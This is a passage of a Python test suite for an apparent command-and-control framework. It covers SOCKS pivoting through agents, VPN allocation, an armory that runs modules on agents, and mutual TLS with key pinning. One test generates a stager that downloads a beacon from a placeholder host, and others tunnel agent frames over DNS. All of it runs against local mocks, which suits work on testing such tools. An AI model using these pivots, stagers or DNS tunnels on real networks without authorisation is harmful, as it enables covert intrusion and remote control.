    return client, agent


def test_the_picture_of_the_reach_shows_the_graph():
    """The topology names the agents, the pivots and the clients."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    target, _, _ = _echo_server()
    target_host, target_port = target.getsockname()

    token = b"operator-token-reach-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client, agent = _pivot_client(server, token)
    try:
        tunnel = client.pivot_open("agent-reach", mode="socks")
        topology = client.pivot_topology()

        nodes = {n["agent_id"]: n for n in topology.get("nodes", [])}
        assert "agent-reach" in nodes, topology
        assert nodes["agent-reach"]["role"] == "pivot"

        edges = topology.get("edges", [])
        assert any(e["tunnel"] == tunnel["stream"] for e in edges), edges
        edge = next(e for e in edges if e["tunnel"] == tunnel["stream"])
        assert edge["agent_id"] == "agent-reach"
        assert edge["dns"] == "remote"
        assert edge["last_active"] > 0

        # A connection through the proxy is accounted for: the client, the
        # target and the bytes that moved.
        conn = _socks5_connect(*tunnel["listen"].rsplit(":", 1),
                               "127.0.0.1", target_port)
        conn.sendall(b"reach-hello")
        assert conn.recv(64) == b"reach-hello"
        conn.close()
        # The accounting is written when the stream really ends, and the
        # stream ends when the target closes the connection.
        deadline = time.time() + 5
        topology = client.pivot_topology()
        while time.time() < deadline and not topology.get("clients"):
            time.sleep(0.1)
            topology = client.pivot_topology()
        clients = topology.get("clients", [])
        assert clients, topology
        assert clients[0]["connections"] >= 1
        connections = topology.get("connections", [])
        assert any(c["target"] == "127.0.0.1" for c in connections), connections
    finally:
        client.close()
        agent.stop()
        server.stop()
        target.close()


def test_a_claim_is_released_as_a_group():
    """The claim names the pivots, and the release tears them down."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-claim-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client, agent = _pivot_client(server, token)
    try:
        first = client.pivot_open("agent-reach", mode="socks", claim="campaign")
        second = client.pivot_open("agent-reach", mode="socks", claim="campaign")
        assert first["claim"] == "campaign"

        claims = client.pivot_claims()
        assert len(claims) == 1, claims
        assert set(claims[0]["tunnels"]) == {first["stream"], second["stream"]}

        closed = client.pivot_release("campaign")
        assert set(closed) == {first["stream"], second["stream"]}
        assert client.pivot_claims() == []
        assert client.pivot_list() == []
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_proxy_asks_for_the_credentials_it_was_given():
    """The SOCKS5 proxy asks for the user and refuses the wrong password."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    target, _, seen = _echo_server()
    target_host, target_port = target.getsockname()

    token = b"operator-token-auth-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client, agent = _pivot_client(server, token)
    try:
        tunnel = client.pivot_open("agent-reach", mode="socks",
                                   user="operator", password="s3cret")
        conn = _socks5_connect_auth(*tunnel["listen"].rsplit(":", 1),
                                    "127.0.0.1", target_port,
                                    "operator", "s3cret")
        conn.sendall(b"authed")
        assert conn.recv(64) == b"authed"
        conn.close()
        assert seen and seen[0] == b"authed"

        # The wrong password is refused before any target is touched.
        bad = socket.create_connection(
            tuple(tunnel["listen"].rsplit(":", 1)), timeout=10)
        bad.sendall(b"\x05\x01\x02")
        assert _recv_exact(bad, 2) == b"\x05\x02"
        bad.sendall(b"\x01\x08operator\x03bad")
        assert _recv_exact(bad, 2) == b"\x01\x01"
        bad.close()
    finally:
        client.close()
        agent.stop()
        server.stop()
        target.close()


def test_the_proxy_refuses_a_denied_target():
    """The deny list of the server is the list the proxy refuses."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-deny-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token}, pivot_deny=["127.0.0.1"])
    server.start()
    client, agent = _pivot_client(server, token)
    try:
        tunnel = client.pivot_open("agent-reach", mode="socks")
        conn = socket.create_connection(
            tuple(tunnel["listen"].rsplit(":", 1)), timeout=10)
        conn.sendall(b"\x05\x01\x00")
        assert _recv_exact(conn, 2) == b"\x05\x00"
        conn.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("127.0.0.1") +
                     (443).to_bytes(2, "big"))
        reply = _recv_exact(conn, 10)
        # 0x02 is "not allowed by ruleset".
        assert reply[1] == 0x02, reply
        conn.close()

        wait_until(lambda: any(c["state"] == "denied"
                                for c in client.pivot_topology().get("connections", [])))
        topology = client.pivot_topology()
        connections = topology.get("connections", [])
        assert any(c["state"] == "denied" for c in connections), connections
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_forward_survives_the_reconnect_of_its_agent():
    """The listener stays bound and the session is taken again."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    target, _, seen = _echo_server()
    target_host, target_port = target.getsockname()

    token = b"operator-token-recon-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-reach")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        tunnel = client.pivot_open("agent-reach", mode="socks")

        conn = _socks5_connect(*tunnel["listen"].rsplit(":", 1),
                               "127.0.0.1", target_port)
        conn.sendall(b"first")
        assert conn.recv(64) == b"first"
        conn.close()

        # The session of the agent dies: the callback connection is closed.
        with server._lock:
            session = server.tunnel_sessions.get("agent-reach")
        assert session is not None
        session.close()

        # The listener is still there and the next connection works: the
        # session of the agent is taken again.  The agent needs a moment
        # to notice that its session is gone, so the connection is retried
        # until it goes through.
        def _second_roundtrip():
            conn = _socks5_connect(*tunnel["listen"].rsplit(":", 1),
                                   "127.0.0.1", target_port)
            try:
                conn.sendall(b"second")
                assert conn.recv(64) == b"second"
            finally:
                conn.close()

        wait_for(_second_roundtrip, timeout=10)
        assert b"first" in seen and b"second" in seen
    finally:
        client.close()
        agent.stop()
        server.stop()
        target.close()


def test_the_server_keeps_the_picture_of_the_reach():
    """The Go server and the dashboard carry the same picture."""
    pivot_go = read_text("server/internal/pivot/topology.go")
    assert "func (m *Manager) Topology() Topology" in pivot_go
    assert "func (m *Manager) Release(claim string)" in pivot_go
    assert "func (m *Manager) denied(" in pivot_go

    socks_go = read_text("server/internal/pivot/socks.go")
    assert "socks5UserPass" in socks_go
    assert "subtle.ConstantTimeCompare" in socks_go

    dash_go = read_text("server/internal/dash/dash.go")
    assert "/api/pivot" in dash_go

    dash_html = read_text("server/internal/dash/index.html")
    assert "refreshReach" in dash_html
    assert "/api/pivot" in dash_html

    config_go = read_text("server/internal/config/config.go")
    assert "PivotDeny" in config_go
    assert "SocksPassword" in config_go


def test_vpn_status_peers_and_allocation():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-vpn-0123456789abc"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-vpn")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        status = client.vpn_status()
        assert status["enabled"] is True
        assert status["network"]

        address = client.vpn_allocate("agent-vpn")
        assert address.startswith("10.77.0.")
        peers = client.vpn_peers()
        assert any(p["address"] == address for p in peers)

        # The reservation is stable: an agent that is given an address
        # keeps it, so the rules that point at it do not have to follow
        # it around.
        again = client.vpn_allocate("agent-vpn")
        assert again == address, (again, address)

        # The reservation shows up in the table of the peers, so the
        # operator sees the address before the agent joins.
        peers = client.vpn_peers()
        assert any(p["address"] == address for p in peers), peers
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_armory_install_run_and_remove():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-armory-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-armory")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        listing = client.armory_list()
        assert listing["verified"] is True
        assert any(e["name"] == "whoami" for e in listing["entries"])

        installed = client.armory_install("whoami")
        assert installed["name"] == "whoami"

        task_id = client.armory_run("whoami", "agent-armory", {"domain": "lab"})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done"
        assert b"whoami" in result["out"]

        with pytest.raises(OperatorError):
            client.armory_run("does-not-exist", "agent-armory")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_alias_run_expands_into_a_task():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-alias-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-alias")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        aliases = client.alias_list()
        assert any(a["name"] == "whoami" for a in aliases)

        task_id = client.alias_run("whoami", "agent-alias")
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done"

        with pytest.raises(OperatorError):
            client.alias_run("nope", "agent-alias")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_team_sync_returns_the_whole_team():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-team-0123456789abc"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-team")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        client.say("working on web-01")

        snapshot = client.team_sync()
        assert snapshot["server_time"] > 0
        assert any(a["id"] == "agent-team" for a in snapshot["agents"])
        assert any(m["text"] == "working on web-01" for m in snapshot["chat"])
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_stager_generate_carries_the_server_address():
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-stager-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        script = client.stager_generate(platform="windows", transport="tcp",
                                         server="10.0.0.5:4001", agent_id="abc",
                                         url="https://10.0.0.5/agent.bin")
        assert "10.0.0.5:4001" in script
        assert "abc" in script
        # The stager needs to know where the beacon comes from, exactly
        # like the server of the framework does.
        with pytest.raises(OperatorError):
            client.stager_generate(platform="windows", transport="tcp",
                                   server="10.0.0.5:4001", agent_id="abc")
    finally:
        client.close()
        server.stop()


def test_new_rpcs_are_role_checked():
    """The new commands follow the same role ladder as the old ones."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-role-0123456789abc"
    server = MockServer(AGENT_PSK, {"alice": token}, roles={"alice": "viewer"})
    server.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        # A viewer may look, but not open a pivot.
        assert client.pivot_list() == []
        assert client.vpn_status()["enabled"] is True
        assert client.armory_list()["verified"] is True
        with pytest.raises(OperatorError):
            client.pivot_open("agent-x")
        with pytest.raises(OperatorError):
            client.armory_run("whoami", "agent-x")
    finally:
        client.close()
        server.stop()


def test_the_operator_console_renders_the_new_views(capsys):
    """The console has to survive a payload it did not expect."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-render-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-render")
    agent.start()

    from umbra_cli import cli

    client = cli.OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        cli.print_pivots(client.pivot_list(), client.pivot_sessions())
        cli.print_vpn_status(client.vpn_status())
        cli.print_vpn_peers(client.vpn_peers())
        cli.print_armory(client.armory_list())
        cli.print_aliases(client.alias_list())
        cli.print_team(client.team_sync())
    finally:
        client.close()
        agent.stop()
        server.stop()

    out = capsys.readouterr().out
    assert "callback sessions:" in out
    assert "network" in out
    assert "NAME" in out
    assert "agents (" in out


def test_dns_tunnel_carries_a_frame():
    """The DNS transport: the frames survive the name based encoding."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import dns  # noqa: WPS433

    server = dns.DnsTunnelServer("umbra.local")
    server.start()
    try:
        client = dns.DnsTunnelClient(server.address, "umbra.local", "agent-dns")
        # The agent sends a frame in its query.
        client.write_frame(b"first-frame")
        client.poll()
        assert server.receive("agent-dns") == b"first-frame"

        # The server answers with a frame of its own.
        server.send("agent-dns", b"second-frame")
        client.poll()
        assert client.read_frame(timeout=2) == b"second-frame"
    finally:
        server.stop()


def test_dns_tunnel_reassembles_a_split_frame():
    """A frame that does not fit into one label is split and put back together."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import dns  # noqa: WPS433

    server = dns.DnsTunnelServer("umbra.local")
    server.start()
    try:
        client = dns.DnsTunnelClient(server.address, "umbra.local", "agent-dns")
        payload = bytes(range(256)) * 2
        client.write_frame(payload)
        # 512 bytes plus the length prefix need several queries.
        for _ in range(30):
            client.poll()
            frame = server.receive("agent-dns")
            if frame is not None:
                break
        assert frame == payload
    finally:
        server.stop()


def test_dns_tunnel_ignores_other_domains():
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import dns  # noqa: WPS433

    server = dns.DnsTunnelServer("umbra.local")
    server.start()
    try:
        query = dns.build_query(7, "00000001..YWdlbnQ.example.com")
        assert server.handle(query) is None
    finally:
        server.stop()


def test_dns_base32_matches_the_other_implementations():
    """The Rust beacon and the Go server use the same base32 alphabet."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli import dns  # noqa: WPS433

    assert dns.base32_encode(b"foobar") == "MZXW6YTBOI"
    assert dns.base32_decode("MZXW6YTBOI") == b"foobar"
    assert dns.base32_decode(dns.base32_encode(b"\x00\xff\x10")) == b"\x00\xff\x10"


# ---------------------------------------------------------------------------
# mutual TLS: the operator console presents a certificate
# ---------------------------------------------------------------------------
def _write_certificates(tmp_path):
    """Create a CA, a server certificate and a console certificate.

    The Go server requires a client certificate when a client CA is
    configured; the test double does the same, so a console that works
    against the test double works against the real server.
    """
    import datetime

    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID

    now = datetime.datetime.now(datetime.timezone.utc)
    later = now + datetime.timedelta(days=1)

    def name(common_name):
        return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])

    # An elliptic curve key: the generation is instant, and the test
    # suite writes a lot of certificates.
    ca_key = ec.generate_private_key(ec.SECP256R1())
    ca_cert = (
        x509.CertificateBuilder()
        .subject_name(name("umbra-test-ca"))
        .issuer_name(name("umbra-test-ca"))
        .public_key(ca_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(minutes=5))
        .not_valid_after(later)
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(ca_key, hashes.SHA256())
    )

    def leaf(common_name, san):
        key = ec.generate_private_key(ec.SECP256R1())
        cert = (
            x509.CertificateBuilder()
            .subject_name(name(common_name))
            .issuer_name(ca_cert.subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(minutes=5))
            .not_valid_after(later)
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(san, critical=False)
            .sign(ca_key, hashes.SHA256())
        )
        return cert, key

    import ipaddress

    server_cert, server_key = leaf(
        "localhost",
        x509.SubjectAlternativeName([
            x509.DNSName("localhost"),
            x509.IPAddress(ipaddress.ip_address("127.0.0.1")),
        ]),
    )
    client_cert, client_key = leaf("console", x509.SubjectAlternativeName([]))
    # A second console certificate: the same name, another key.  A pin
    # has to tell them apart, a name cannot.
    other_cert, other_key = leaf("console", x509.SubjectAlternativeName([]))

    def write(name_, cert, key):
        path = os.path.join(tmp_path, name_)
        with open(path, "wb") as handle:
            handle.write(cert.public_bytes(serialization.Encoding.PEM))
            handle.write(
                key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                )
            )
        return path

    ca_path = os.path.join(tmp_path, "ca.pem")
    with open(ca_path, "wb") as handle:
        handle.write(ca_cert.public_bytes(serialization.Encoding.PEM))
    return {
        "ca": ca_path,
        "server": write("server.pem", server_cert, server_key),
        "client": write("client.pem", client_cert, client_key),
        "other": write("other.pem", other_cert, other_key),
    }


def test_operator_console_connects_over_mutual_tls(tmp_path):
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    certs = _write_certificates(str(tmp_path))
    server = MockServer(
        AGENT_PSK,
        {"alice": OP_TOKEN},
        tls_cert=certs["server"],
        tls_key=certs["server"],
        tls_client_ca=certs["ca"],
    )
    server.start()
    try:
        from umbra_cli.client import OperatorClient

        client = OperatorClient(
            server.address,
            OP_TOKEN.decode(),
            "alice",
            tls=True,
            tls_ca=certs["ca"],
            tls_server_name="localhost",
            tls_cert=certs["client"],
            tls_key=certs["client"],
        )
        try:
            client.connect()
            who = client.whoami()
            assert who["name"] == "alice"
            assert who["role"] == "admin"
        finally:
            client.close()
    finally:
        server.stop()


def test_the_pin_of_a_certificate_is_the_same_on_every_implementation():
    """The pin is a vector, like the frames are.

    The Go server, the console and the reference tools have to come to
    the same pin for the same certificate, so the value is pinned in
    contracts/vectors.json and every implementation checks itself
    against it.
    """
    from umbra_cli.tls import spki_pin_of_pem

    vector = VECTORS["pin"]
    certificate = os.path.join(ROOT, "contracts", vector["certificate"])
    assert spki_pin_of_pem(certificate) == vector["spki_sha256"]
    # The pin is the fingerprint of the public key and not of the
    # certificate: it is 32 bytes written as hex.
    assert len(vector["spki_sha256"]) == 64


def test_a_console_that_pins_the_key_of_the_server_talks_to_it(tmp_path):
    """A pinned console trusts the key and not the authority."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    from umbra_cli.tls import spki_pin_of_pem

    certs = _write_certificates(str(tmp_path))
    pin = spki_pin_of_pem(certs["server"])
    server = MockServer(
        AGENT_PSK,
        {"alice": OP_TOKEN},
        tls_cert=certs["server"],
        tls_key=certs["server"],
        tls_client_ca=certs["ca"],
    )
    server.start()
    try:
        from umbra_cli.client import OperatorClient

        client = OperatorClient(
            server.address,
            OP_TOKEN.decode(),
            "alice",
            tls=True,
            tls_ca=certs["ca"],
            tls_server_name="localhost",
            tls_cert=certs["client"],
            tls_key=certs["client"],
            tls_pin=pin,
        )
        try:
            client.connect()
            who = client.whoami()
            assert who["name"] == "alice"
        finally:
            client.close()
    finally:
        server.stop()


def test_a_console_with_the_wrong_pin_never_sends_its_token(tmp_path):
    """The pin is checked before the token leaves the console.

    A server that holds another key gets the TLS handshake and nothing
    else: the token is never written to it.
    """
    import ssl

    from umbra_cli.client import OperatorError, OperatorClient
    from umbra_cli.tls import spki_pin_of_pem

    certs = _write_certificates(str(tmp_path))
    good = spki_pin_of_pem(certs["server"])
    wrong = spki_pin_of_pem(certs["other"])

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certs["server"], certs["server"])
    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    port = listener.getsockname()[1]
    received = []

    def serve():
        conn, _ = listener.accept()
        try:
            sock = context.wrap_socket(conn, server_side=True)
        except (ssl.SSLError, OSError):
            received.append(b"")
            return
        try:
            sock.settimeout(5)
            received.append(sock.recv(65536))
        except (ssl.SSLError, OSError):
            received.append(b"")
        finally:
            try:
                sock.close()
            except OSError:
                pass

    thread = threading.Thread(target=serve, name="umbra-pin-server")
    thread.start()
    try:
        client = OperatorClient(
            f"127.0.0.1:{port}",
            OP_TOKEN.decode(),
            "alice",
            tls=True,
            tls_ca=certs["ca"],
            tls_server_name="localhost",
            tls_pin=wrong,
        )
        with pytest.raises(OperatorError):
            client.connect()
        client.close()
        thread.join(timeout=10)
        # The server saw the handshake and nothing else: the first byte
        # of the umbra frame never arrived.
        assert received == [b""]
        # The pin of the server is the one that would have worked.
        assert good != wrong
    finally:
        listener.close()


def test_a_console_may_hold_the_old_key_and_the_new_one(tmp_path):
    """The handover of a renewed key: the list of pins holds both."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    from umbra_cli.client import OperatorClient
    from umbra_cli.tls import spki_pin_of_pem

    certs = _write_certificates(str(tmp_path))
    pin = spki_pin_of_pem(certs["server"])
    other = spki_pin_of_pem(certs["other"])
    server = MockServer(
        AGENT_PSK,
        {"alice": OP_TOKEN},
        tls_cert=certs["server"],
        tls_key=certs["server"],
        tls_client_ca=certs["ca"],
    )
    server.start()
    try:
        # The console holds both keys: the one of the server and another
        # one that will be the key of the next certificate.
        client = OperatorClient(
            server.address,
            OP_TOKEN.decode(),
            "alice",
            tls=True,
            tls_ca=certs["ca"],
            tls_server_name="localhost",
            tls_cert=certs["client"],
            tls_key=certs["client"],
            tls_pin=f"{pin},{other}",
        )
        try:
            client.connect()
            assert client.whoami()["name"] == "alice"
        finally:
            client.close()
    finally:
        server.stop()


def test_the_console_prints_the_pin_of_a_certificate(tmp_path):
    """`umbra pin` is a local command: it needs no server and no token."""
    import subprocess

    from umbra_cli.tls import spki_pin_of_pem

    certs = _write_certificates(str(tmp_path))
    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(ROOT, "operator")
    proc = subprocess.run(
        [sys.executable, "-m", "umbra_cli", "pin", certs["server"]],
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert proc.stdout.strip() == spki_pin_of_pem(certs["server"])
    # The same command on the certificate of the vectors prints the
    # value the vectors hold.
    vector = os.path.join(ROOT, "contracts", VECTORS["pin"]["certificate"])
    proc = subprocess.run(
        [sys.executable, "-m", "umbra_cli", "pin", vector],
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert proc.stdout.strip() == VECTORS["pin"]["spki_sha256"]


def test_the_server_refuses_a_console_that_does_not_hold_the_pinned_key(tmp_path):
    """The server pins the console the same way the console pins it."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    from umbra_cli.client import OperatorClient, OperatorError
    from umbra_cli.netio import StreamError
    from umbra_cli.tls import spki_pin_of_pem

    certs = _write_certificates(str(tmp_path))
    pin = spki_pin_of_pem(certs["client"])
    server = MockServer(
        AGENT_PSK,
        {"alice": OP_TOKEN},
        tls_cert=certs["server"],
        tls_key=certs["server"],
        tls_client_ca=certs["ca"],
        tls_client_spki=pin,
    )
    server.start()
    try:
        # The console that holds the pinned key is served.
        good = OperatorClient(
            server.address,
            OP_TOKEN.decode(),
            "alice",
            tls=True,
            tls_ca=certs["ca"],
            tls_server_name="localhost",
            tls_cert=certs["client"],
            tls_key=certs["client"],
        )
        try:
            good.connect()
            assert good.whoami()["name"] == "alice"
        finally:
            good.close()

        # The console that holds another key is refused, even though the
        # certificate carries the same name and the same authority.
        bad = OperatorClient(
            server.address,
            OP_TOKEN.decode(),
            "alice",
            tls=True,
            tls_ca=certs["ca"],
            tls_server_name="localhost",
            tls_cert=certs["other"],
            tls_key=certs["other"],
        )
        try:
            with pytest.raises((OperatorError, StreamError, OSError)):
                bad.connect()
        finally:
            bad.close()
    finally:
        server.stop()


def test_a_tls_session_is_never_entered_by_two_threads_at_once(tmp_path):
    """The transport must serialise the TLS session.

    OpenSSL keeps the record state in the session itself, so two threads
    inside one session at the same time scramble the stream: the peer sees a
    bad record MAC, or the link dies half way through a frame.  The console
    reads the event stream while it asks for things, so the session is used
    from two threads by design -- the transport has to keep them apart.

    The check is an invariant, not a race: the socket is instrumented, and
    two calls into the session at the same time are a failure.
    """
    import ssl

    certs = _write_certificates(str(tmp_path))
    server_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_ctx.load_cert_chain(certs["server"], certs["server"])
    client_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    client_ctx.check_hostname = False
    client_ctx.verify_mode = ssl.CERT_NONE

    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    port = listener.getsockname()[1]

    def serve():
        conn, _ = listener.accept()
        sock = server_ctx.wrap_socket(conn, server_side=True)
        try:
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                sock.sendall(data)
        except (ssl.SSLError, OSError):
            pass

    server = threading.Thread(target=serve, name="umbra-echo")
    server.start()
    raw = socket.create_connection(("127.0.0.1", port), timeout=10)
    client = client_ctx.wrap_socket(raw, server_hostname="localhost")

    # Instrument the session: every call into OpenSSL is counted, and two
    # calls at the same time are the failure this test is about.
    inside = 0
    overlaps = []
    guard = threading.Lock()
    real_recv = client.recv
    real_send = client.send

    def counted(func):
        def wrapper(*args, **kwargs):
            nonlocal inside
            with guard:
                inside += 1
                if inside > 1:
                    overlaps.append(inside)
            try:
                return func(*args, **kwargs)
            finally:
                with guard:
                    inside -= 1

        return wrapper

    client.recv = counted(real_recv)
    client.send = counted(real_send)

    stream = netio.Stream(client, timeout=10)
    payload = b"umbra" * 512
    # A frame the transport accepts: the magic, the length and the tag.
    prelude = (
        wire.MAGIC
        + bytes([1, 0, int(wire.MsgType.OP_EVENT), 1, 0, 0])
        + len(payload).to_bytes(4, "big")
    )
    frame = prelude + b"\x00" * wire.NONCE_LEN + payload + b"\x00" * wire.TAG_LEN
    errors = []

    def writer():
        try:
            for _ in range(200):
                stream.send_frame(frame)
        except Exception as exc:  # noqa: BLE001 - the test wants the reason
            errors.append(exc)

    def reader():
        try:
            for _ in range(200):
                got = stream.recv_frame()
                if got != frame:
                    errors.append(ValueError("frame came back different"))
                    return
        except Exception as exc:  # noqa: BLE001 - the test wants the reason
            errors.append(exc)

    threads = [threading.Thread(target=writer), threading.Thread(target=reader)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join(timeout=30)
    try:
        assert not errors, errors
        assert not overlaps, f"the TLS session was used by two threads: {overlaps}"
    finally:
        stream.close()
        server.join(timeout=5)
        listener.close()


def test_tls_link_carries_a_request_and_an_event_at_the_same_time(tmp_path):
    """A TLS session must survive a read and a write at the same time.

    The console asks for things while it reads the event stream, and the
    server answers while it pushes events.  Both ends therefore read and
    write the *same* TLS session at once.  OpenSSL does not allow that:
    two threads inside one session scramble the record layer, and the link
    dies with a bad record MAC or a half written frame.  The transport
    serialises the session, so the traffic has to survive it.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    certs = _write_certificates(str(tmp_path))
    server = MockServer(
        AGENT_PSK,
        {"alice": OP_TOKEN},
        tls_cert=certs["server"],
        tls_key=certs["server"],
        tls_client_ca=certs["ca"],
    )
    server.start()
    try:
        from umbra_cli.client import OperatorClient

        client = OperatorClient(
            server.address,
            OP_TOKEN.decode(),
            "alice",
            tls=True,
            tls_ca=certs["ca"],
            tls_server_name="localhost",
            tls_cert=certs["client"],
            tls_key=certs["client"],
        )
        errors = []
        try:
            client.connect()

            def hammer() -> None:
                try:
                    for index in range(30):
                        client.say(f"line {index}")
                        client.whoami()
                except Exception as exc:  # noqa: BLE001 - the test wants the reason
                    errors.append(exc)

            writer = threading.Thread(target=hammer, name="umbra-writer")
            writer.start()
            # The reader runs while the writer writes: this is the pair that
            # used to break the session.
            chats = 0
            deadline = time.time() + 30
            while chats < 30 and time.time() < deadline:
                event = client.next_event(timeout=5.0)
                if event is None:
                    break
                if event.get("kind") == "chat":
                    chats += 1
            writer.join(timeout=30)
            assert not errors, errors
            assert chats >= 10, f"only {chats} chat events arrived"
            # The link is still good after all of that.
            assert client.whoami()["name"] == "alice"
        finally:
            client.close()
    finally:
        server.stop()


def test_mutual_tls_refuses_a_console_without_a_certificate(tmp_path):
    """A stolen token alone must not be enough to take over an operation."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    certs = _write_certificates(str(tmp_path))
    server = MockServer(
        AGENT_PSK,
        {"alice": OP_TOKEN},
        tls_cert=certs["server"],
        tls_key=certs["server"],
        tls_client_ca=certs["ca"],
    )
    server.start()
    try:
        from umbra_cli.client import OperatorClient, OperatorError

        client = OperatorClient(
            server.address,
            OP_TOKEN.decode(),
            "alice",
            timeout=5,
            tls=True,
            tls_ca=certs["ca"],
            tls_server_name="localhost",
        )
        try:
            with pytest.raises((OperatorError, OSError)):
                client.connect()
